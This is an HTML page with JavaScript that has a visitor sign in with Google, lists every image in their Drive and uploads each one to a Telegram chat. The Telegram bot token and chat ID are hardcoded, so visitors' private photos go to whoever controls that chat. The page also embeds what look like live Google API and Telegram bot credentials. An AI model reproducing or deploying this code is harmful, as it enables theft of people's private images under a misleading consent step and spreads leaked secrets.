<!DOCTYPE html>
<html>
<head>
  <title>Send Google Drive Images to Telegram Bot</title>
  <script src="https://apis.google.com/js/api.js"></script>
  <script src="https://accounts.google.com/gsi/client" async defer></script>
</head>
<body>
  <h2>Send all images from Google Drive to Telegram Bot</h2>
  <button id="authorize_button" style="display:none;">Sign in with Google</button>
  <button id="signout_button" style="display:none;">Sign Out</button>
  <pre id="output"></pre>

  <script>
    const CLIENT_ID = '448184436252-2psfum2qgah9v1ahbt10es5ogr60n19s.apps.googleusercontent.com';
    const API_KEY = 'AIzaSyCFdP_3PB4HPXix5SuPCe803Q0T0mBS5H0';
    const SCOPES = 'https://www.googleapis.com/auth/drive.readonly';

    const TELEGRAM_BOT_TOKEN = '7690497444:AAH1HVDn2HKjt6fIvhr9kTOfwxUYOPNq3Rw';
    const TELEGRAM_CHAT_ID = '6894787120';

    let tokenClient;
    let gapiInited = false;
    let gisInited = false;

    function gapiLoaded() {
      gapi.load('client', initializeGapiClient);
    }

    async function initializeGapiClient() {
      await gapi.client.init({
        apiKey: API_KEY,
        discoveryDocs: ['https://www.googleapis.com/discovery/v1/apis/drive/v3/rest'],
      });
      gapiInited = true;
      maybeEnableButtons();
    }

    function gisLoaded() {
      tokenClient = google.accounts.oauth2.initTokenClient({
        client_id: CLIENT_ID,
        scope: SCOPES,
        callback: async (resp) => {
          if (resp.error !== undefined) throw resp;
          document.getElementById('signout_button').style.display = 'block';
          document.getElementById('authorize_button').style.display = 'none';
          await listImagesAndSend();
        },
      });
      gisInited = true;
      maybeEnableButtons();
    }

    function maybeEnableButtons() {
      if (gapiInited && gisInited) {
        document.getElementById('authorize_button').style.display = 'block';
      }
    }

    function handleAuthClick() {
      if (gapi.client.getToken() === null) {
        tokenClient.requestAccessToken({prompt: 'consent'});
      } else {
        tokenClient.requestAccessToken({prompt: ''});
      }
    }

    function handleSignoutClick() {
      const token = gapi.client.getToken();
      if (token !== null) {
        google.accounts.oauth2.revoke(token.access_token);
        gapi.client.setToken('');
        document.getElementById('output').textContent = 'Signed out.';
        document.getElementById('authorize_button').style.display = 'block';
        document.getElementById('signout_button').style.display = 'none';
      }
    }

    async function listImagesAndSend() {
      let files = [];
      let pageToken = null;

      do {
        let response = await gapi.client.drive.files.list({
          q: "mimeType contains 'image/'",
          fields: 'nextPageToken, files(id, name)',
          spaces: 'drive',
          pageToken: pageToken,
        });
        files = files.concat(response.result.files);
        pageToken = response.result.nextPageToken;
      } while (pageToken);

      document.getElementById('output').textContent = `Found ${files.length} image(s).\nSending to Telegram...\n`;

      for (let file of files) {
        document.getElementById('output').textContent += `Sending: ${file.name}\n`;
        await sendImageToTelegram(file.id, file.name);
      }

      document.getElementById('output').textContent += '✅ All images sent!';
    }

    async function sendImageToTelegram(fileId, fileName) {
      try {
        const accessToken = gapi.client.getToken().access_token;
        const fileUrl = `https://www.googleapis.com/drive/v3/files/${fileId}?alt=media`;

        const response = await fetch(fileUrl, {
          headers: { Authorization: `Bearer ${accessToken}` }
        });

        if (!response.ok) throw new Error('Failed to fetch image');

        const blob = await response.blob();

        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, fileName);
        formData.append('caption', fileName);

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

        const telegramResponse = await fetch(telegramUrl, {
          method: 'POST',
          body: formData,
        });

        if (!telegramResponse.ok) {
          const errorText = await telegramResponse.text();
          throw new Error(`Telegram API error: ${errorText}`);
        }
      } catch (err) {
        document.getElementById('output').textContent += `❌ Error sending ${fileName}: ${err.message}\n`;
      }
    }

    window.onload = function() {
      gapiLoaded();
      gisLoaded();
      document.getElementById('authorize_button').onclick = handleAuthClick;
      document.getElementById('signout_button').onclick = handleSignoutClick;
    };
  </script>
</body>
</html>
